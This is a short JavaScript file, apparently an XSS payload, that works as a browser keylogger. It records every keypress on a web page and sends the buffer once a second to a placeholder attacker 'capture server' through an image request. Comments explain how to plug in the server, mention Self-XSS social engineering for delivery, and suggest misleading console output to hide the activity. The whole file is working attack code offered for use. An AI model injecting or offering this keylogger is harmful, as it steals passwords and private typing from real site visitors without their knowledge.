/*
 * Store keypresses on a site in a buffer and send them to a capture server on
 * preset intervals. Default: 1000 ms.
 *
 * This attack is not really feasible in modern, updated browsers without a
 * Self-XSS social engineering attack.
 */

var buffer = [];
var attacker = '<YOUR_CAP_SERVER_HERE>' + '/?c='; // Watch the leading slash.

document.onkeypress = function(e) {
    buffer.push(e.key);
}

window.setInterval(function() {
    if (buffer.length > 0) {
      /* Your capture server will need to unescape this: */
      var data = encodeURIComponent(JSON.stringify(buffer));

      /* Make GET request. */
      new Image().src = attacker + data;
      buffer = []; // Clear buffer for next send interval.
    }
}, 1000); // Milliseconds.

/* Add your own cheeky console behaviour to hide the naughty stuff. */
console.log("SECRET HACKING MODE ACTIVATED");
